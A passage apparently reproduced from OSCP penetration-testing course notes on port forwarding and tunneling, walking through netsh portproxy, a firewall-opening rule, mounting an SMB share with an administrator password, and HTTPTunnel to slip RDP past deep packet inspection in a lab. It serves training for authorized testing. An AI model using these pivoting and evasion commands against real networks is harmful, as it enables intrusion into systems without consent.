0.11.0.4
The programs included with the Kali GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.
Kali GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
kali@kali:~$ 


• Now that our tunnel is active, we can attempt to launch an Nmap scan of the target’s MySQL port via our localhost port forward on TCP port 1234:

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/20/70.jpg)

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/20/71.jpg)

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/20/72.jpg)

kali@kali:~$ sudo nmap -sS -sV 127.0.0.1 -p 1234
Starting Nmap 7.60 ( https://nmap.org ) at 2019-04-20 05:00 EEST
Nmap scan report for localhost (127.0.0.1)
Host is up (0.00026s latency).
PORT STATE SERVICE VERSION
1234/tcp open mysql MySQL 5.5.5-10.1.31-MariaDB
Nmap done: 1 IP address (1 host up) scanned in 0.93 seconds

• The setup seems to be working.

•  We have successfully scanned the Windows 10 machine’s SQLservice through a remote port forward on our Kali attack machine.











20.3.1.1 Exercises

1. Obtain a reverse shell on your Windows lab client through the Sync Breeze vulnerability.

2. Use plink.exe to establish a remote port forward to the MySQL service on your Windows 10client.

3. Scan the MySQL port via the remote port forward.
20.4 NETSH

20.4 NETSH

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/20/73.jpg)

• During an assessment, we have compromised a Windows 10 target through a remote vulnerability and were able to successfully elevate our privileges to SYSTEM.

•  After enumerating the compromised machine, we discover that in addition to being connected to the current network(10.11.0.x), it has an additional network interface that seems to be connected to a different network(192.168.1.x). 

• In this internal subnet, we identify a Windows Server 2016 machine (192.168.1.110)that has TCP port 445 open.

• To continue the scenario, we can now look for ways to pivot inside the victim network from theSYSTEM-level shell on the Windows 10 machine.

•  Because of our privilege level, we do not have todeal with User Account Control (UAC), which means we can use the netsh595 utility (installed bydefault on every modern version of Windows) for port forwarding and pivoting.

• However, for this to work, the Windows system must have the IP Helper service running and IPv6support must be enabled for the interface we want to use. Fortunately, both are on and enabled bydefault on Windows operating systems.

• We can check that the IP Helper service is running from the Windows Services program to confirmthis:

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/20/74.jpg)

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/20/75.jpg)

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/20/76.jpg)

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/20/77.jpg)

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/20/78.jpg)

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/20/79.jpg)

• We can confirm IPv6 support in the network interface’s settings:

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/20/80.jpg)


![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/20/81.jpg)

• Similar to the SSH local port forwarding example, we will attempt to redirect traffic destined for thecompromised Windows 10 machine on TCP port 4455 to the Windows Server 2016 machine onport.

• In this example, we will use the netsh (interface) context to add an IPv4-to-IPv4 (v4tov4) proxy(portproxy) listening on 10.11.0.22 (listenaddress=10.11.0.22), port 4455(listenport=4455) that will forward to the Windows 2016

•  Server(connectaddress=192.168.1.110) on port 445 (connectport=445):

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/20/82.jpg)

C:\Windows\system32> netsh interface portproxy add v4tov4 listenport=4455 listenaddres
s=10.11.0.22 connectport=445 connectaddress=192.168.1.110


![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/20/83.jpg)

C:\Windows\system32> netstat -anp TCP | find "4455"
TCP 10.11.0.22:4455 0.0.0.0:0 LISTENING


• Using netstat, we can confirm that port 4455 is listening on the compromised Windows host:

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/20/84.jpg)

• By default, the Windows Firewall will disallow inbound connections on TCP port 4455, which willprevent us from interacting with our tunnel.

• Given that we are running with SYSTEM privileges, wecan easily remedy this by adding a firewall rule to allow inbound connections on that port.

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/20/85.jpg)

C:\Windows\system32> netsh advfirewall firewall add rule name="forward_port_rule" prot
ocol=TCP dir=in localip=10.11.0.22 localport=4455 action=allow
Ok.

• These netsh options are self-explanatory, but note that we allow (action=allow) specific inbound(dir=in) connections and leverage the firewall (advfirewall) context of netsh.

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/20/86.jpg)

• As a final step, we can try to connect to our compromised Windows machine on port 4455 using smb client. If everything has gone according to plan, the traffic should be redirected and the available network shares on the internal Windows Server 2016 machine should be returned.

• As with our earlier scenario, Samba needs to be configured with a minimum SMB version of SMBv2.

• This is superfluous but we will include the commands here for completeness:

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/20/87.jpg)

kali@kali:~$ sudo nano /etc/samba/smb.conf'
kali@kali:~$ cat /etc/samba/smb.conf
...
Please note that you also need to set appropriate Unix permissions
# to the drivers directory for these users to have write rights in it
; write list = root, @lpadmin
min protocol = SMB2
kali@kali:~$ sudo /etc/init.d/smbd restart
[ ok ] Restarting smbd (via systemctl): smbd.service.
kali@kali:~$ smbclient -L 10.11.0.22 --port=4455 --user=Administrator
Unable to initialize messaging context
Enter WORKGROUP\Administrator's password:
 Sharename Type Comment
 --------- ---- -------
 ADMIN$ Disk Remote Admin
 C$ Disk Default share
 Data Disk
 IPC$ IPC Remote IPC
 NETLOGON Disk Logon server share
 SYSVOL Disk Logon server share
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.11.0.22 failed (Error NT_STATUS_IO_TIMEOUT)
Failed to connect with SMB1 -- no workgroup available

• We successfully listed the shares, but smbclient generated an error.

• This timeout issue isgenerally caused by a port forwarding error.

• but let’s test this and determine if we can interact withthe shares.

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/20/88.jpg)

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/20/89.jpg)

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/20/90.jpg)

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/20/91.jpg)

kali@kali:~$ sudo mkdir /mnt/win10_share
kali@kali:~$ sudo mount -t cifs -o port=4455 //10.11.0.22/Data -o username=Administrat
or,password=Qwerty09! /mnt/win10_share
kali@kali:~$ ls -l /mnt/win10_share/
total 1
-rwxr-xr-x 1 root root 7 Apr 17 2019 data.txt
kali@kali:~$ cat /mnt/win10_share/data.txt
data 


• As demonstrated by the above commands, this error prohibits us from listing workgroups but itdoes not impact our ability to mount the share. 

• The port forwarding was successful.


![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/20/92.jpg)












20.4.1.1 Exercise


1. Obtain a reverse shell on your Windows lab client through the Sync Breeze vulnerability.

2. Using the SYSTEM shell, attempt to replicate the port forwarding example using netsh.
20.5 HTTPTunnel-ing Through Deep Packet Inspection


20.5 HTTPTunnel-ing Through Deep Packet Inspection

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/20/93.jpg)

• So far, we have traversed firewalls based on port filters and stateful inspection.

• However, certain deep packet content inspection devices may only allow specific protocols.

• If, for example, the SSH protocol is not allowed, all the tunnels that relied on this protocol would fail.

• To demonstrate this, we will consider a new scenario. 

• Similar to our *NIX scenarios, let’s assume we have compromised a Linux server through a vulnerability, elevated our privileges to root, and have gained access to the passwords for both the root and student users on the machine.

• Even though our compromised Linux server does not actually have deep packet inspection implemented, for the purposes of this section we will assume that a deep packet content inspection feature has been implemented that only allows the HTTP protocol.

•  Unlike the previous scenarios,an SSH-based tunnel will not work here.

• In addition, the firewall in this scenario only allows ports 80, 443, and 1234 inbound and outbound.

• Port 80 and 443 are allowed because this machine is a web server, but 1234 was obviously an oversight since it does not currently map to any listening port in the internal network.

• In order to simulate this scenario, we will run the http_tunneling.sh script on our dedicated Linux client.

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/20/94.jpg)


root@debian:~# cat /root/port_forwarding_and_tunneling/http_tunneling.sh
#!/bin/bash
# Clear iptables rules
iptables -P INPUT ACCEPT
iptables -P FORWARD ACCEPT
iptables -P OUTPUT ACCEPT
iptables -F
iptables -X
# SSH Scenario
iptables -F
iptables -P INPUT DROP
iptables -P FORWARD DROP
iptables -A INPUT -i lo -j ACCEPT
iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
iptables -A INPUT -p tcp --dport 80 -m state --state NEW -j ACCEPT
iptables -A INPUT -p tcp --dport 443 -m state --state NEW -j ACCEPT
iptables -A INPUT -p tcp --dport 1234 -m state --state NEW -j ACCEPT
iptables -A INPUT -i lo -j ACCEPT
root@debian:~# /root/port_forwarding_and_tunneling/http_tunneling.sh
![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/20/95.jpg)

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/20/96.jpg)



![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/20/97.jpg)

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/20/98.jpg)



![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/20/99.jpg)


![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/20/100.jpg)

• In this case, our goal is to initiate a remote desktop connection from our Kali Linux machine to the Windows Server 2016 through the compromised Linux server using only the HTTP protocol.

• We will rely on HTTPTunnel to encapsulate our traffic within HTTP requests, creating an “HTTPtunnel”. 

• HTTPTunnel uses a client/server model and we’ll need to first install the tool and then run both a client and a server.

The s tunnel  tool is similar to HTTPTunne and can be used in similar ways.

It is a multiplatform GNU/GPL-licensed proxy that encrypts arbitrary TCP connections with SSL/TLS.

• We can install HTTPtunnel from the Kali Linux repositories as follows:

kali@kali:~$ apt-cache search httptunnel
httptunnel - Tunnels a data stream in HTTP requests
kali@kali:~$ sudo apt install httptunnel
...

• Before diving in, we will describe the traffic flow we are trying to achieve.

• First, remember that we have a shell on the internal Linux server.

• This shell is HTTP-based (which is the only protocol allowed through the firewall) and we are connected to it via TCP port 443 (the vulnerable service port).

• We will create a local port forward on this machine bound to port 8888, which will forward all connections to the Windows Server on port 3389, the Remote Desktop port.

• Note that this port forward is unaffected by the HTTP protocol restriction since both machines are on the same network and the traffic does not traverse the deep packet inspection device.

•  However, the protocol restriction will create a problem for us when we attempt to connect a tunnel from the Linux server to our Internet-based Kali Linux machine.

•  This is where our SSH-based tunnel will be blocked because of the disallowed protocol.

• To solve this, we will create an HTTP-based tunnel (a permitted protocol) between the machinesusing HTTPTunnel.

• The “input” of this HTTP tunnel will be on our Kali Linux machine (localhost port8080) and the tunnel will “output” to the compromised Linux machine on listening port 1234 (across the firewall).

•  Here the HTTP requests will be decapsulated, and the traffic will be handed off to the listening port 8888 (still on the compromised Linux server) which, thanks to our 
 SSH-based localforward, is redirected to our Windows target’s Remote Desktop port.


• When this is set up, we will initiate a Remote Desktop session to our Kali Linux machine’s localhostport 8080. 

• The request will be HTTP-encapsulated, sent across the HTTP Tunnel as HTTP traffic toport 1234 on the Linux server, decapsulated, and finally sent to our Windows target’s remote desktop port.

• Take a moment to understand this admittedly complex traffic flow before proceeding.

•  Port forwarding with encapsulation can be complicated because we have to consider firewall rules,protocol limitations, and both inbound and outbound port allocations.

• It often helps to pause and write a map or flow chart like the one shown in Figure 304 below before executing the actualcommands.

•  This process is complicated enough without attempting to figure out both logic flowand syntax simultaneously


![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/20/101.jpg)

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/20/102.jpg)

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/20/103.jpg)

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/20/104.jpg)

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/20/105.jpg)

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/20/106.jpg)

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/20/107.jpg)


![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/20/108.jpg)


![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/20/109.jpg)



• To begin building our tunnel, we will create a local SSH-based port forward between ourcompromised Linux machine and the Windows remote desktop target.

•  Remember, protocol doesnot matter here (SSH is allowed) as this traffic is unaffected by deep packet inspection on theinternal network.

• To do this, we will create a local forward (-L) from this machine (127.0.0.1) and will log in asstudent, using the new password we created post-exploitation.

•  We will forward all requests onport 8888 (0.0.0.0:8888) to the Windows Server’s remote desktop port (192.168.1.110:3389):

www-data@debian:/$ ssh -L 0.0.0.0:8888:192.168.1.110:3389 student@127.0.0.1
ssh -L 0.0.0.0:8888:192.168.1.110:3389 student@127.0.0.1
Could not create directory '/var/www/.ssh'.
The authenticity of host '127.0.0.1 (127.0.0.1)' can't be established.
ECDSA key fingerprint is SHA256:RdJnCwlCxEG+c6nShI13N6oykXAbDJkRma3cLtknmJU.
Are you sure you want to continue connecting (yes/no)? yes
yes
Failed to add the host to the list of known hosts (/var/www/.ssh/known_hosts).
student@127.0.0.1's password: lab
...
student@debian:~$ ss -antp | grep "8888"
ss -antp | grep "8888"
LISTEN 0 128 *:8888 *:*


![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/20/110.jpg)

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/20/111.jpg)

student@debian:~$ hts --forward-port localhost:8888 1234
hts --forward-port localhost:8888 1234
student@debian:~$ ps aux | grep hts
ps aux | grep hts
student 12080 0.0 0.0 2420 68 ? Ss 07:49 0:00 hts --forward-port lo
calhost:8888 1234
student 12084 0.0 0.0 4728 836 pts/4 S+ 07:49 0:00 grep hts
student@debian:~$ ss -antp | grep "1234"
ss -antp | grep "1234"
LISTEN 0 1 *:1234 *:* users:(("hts",pid=12080,fd=4))

The ps and ss commands show that the HTTPTunnel server is up and running.

• Next, we must create an HTTPTunnel out to our Kali Linux machine in order to slip our traffic pastthe HTTP-only protocol restriction. 

• As mentioned above, HTTPTunnel uses both a client (htc) anda server (hts).

• We will set up the server (hts), which will listen on localhost port 1234, decapsulate the traffic fromthe incoming HTTP stream, and redirect it to localhost port 8888
 (--forward-portlocalhost:8888) which, thanks to the previous command, is redirected to the Windows target’sremote desktop port:

• Next, we need an HTTPTunnel client that will take our remote desktop traffic, encapsulate it into anHTTP stream, and send it to the listening HTTPTunnel server.

• This (htc) command will listen onlocalhost port 8080 (--forward-port 8080), HTTP-encapsulate the traffic, and forward it acrossthe firewall to our listening HTTPTunnel server on port 1234 (10.11.0.128:1234):

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/20/112.jpg)

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/20/113.jpg)

kali@kali:~$ htc --forward-port 8080 10.11.0.128:1234
kali@kali:~$ ps aux | grep htc
kali 10051 0.0 0.0 6536 92 ? Ss 03:33 0:00 htc --forward-port 8
080 10.11.0.128:1234
kali 10053 0.0 0.0 12980 1056 pts/0 S+ 03:33 0:00 grep htc
kali@kali:~$ ss -antp | grep "8080"
LISTEN 0 0 0.0.0.0:8080 0.0.0.0:* users:(("htc",pid=2692,fd=4))

• Again, the ps and ss commands show that the HTTPTunnel client is up and running.

• Now, all traffic sent to TCP port 8080 on our Kali Linux machine will be redirected into ourHTTPTunnel (where it is HTTP-encapsulated, sent across the firewall to the compromised Linuxserver and decapsulated) and redirected again to the Windows Server’s remote desktop service.

• We can validate that this is working by starting Wireshark to sniff the traffic, and verify it is beingHTTP-encapsulated, before initiating a remote desktop connection against our Kali Linux machine’slistening port 8080:


![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/20/114.jpg)


![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/20/115.jpg)

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/20/116.jpg)

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/20/117.jpg)

• Excellent! The remote desktop connection was successful.

• Inspecting the traffic in Wireshark, we confirm that it is indeed HTTP-encapsulated, and would have bypassed the deep packet content inspection device.

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/20/118.jpg)

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/20/119.jpg)

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/20/120.jpg)

20.5.1.1 Exercises


1. Connect to your dedicated Linux lab client as the student account using rdesktop and run thehttp_tunneling.sh script from /root/port_forwarding_and_tunneling/ as root.

2. Start the apache2 service and exploit the vulnerable web application hosted on port 443(covered in a previous module) in order to get a reverse HTTP shell.

3. Replicate the scenario demonstrated above using your dedicated clients.
20.6 Wrapping Up


 In this module, we covered the concepts of port forwarding and tunneling. 

 The module containstools to apply these techniques on both Windows and *NIX operating systems, which allow us tobypass various egress restrictions as well as deep packet inspection devices.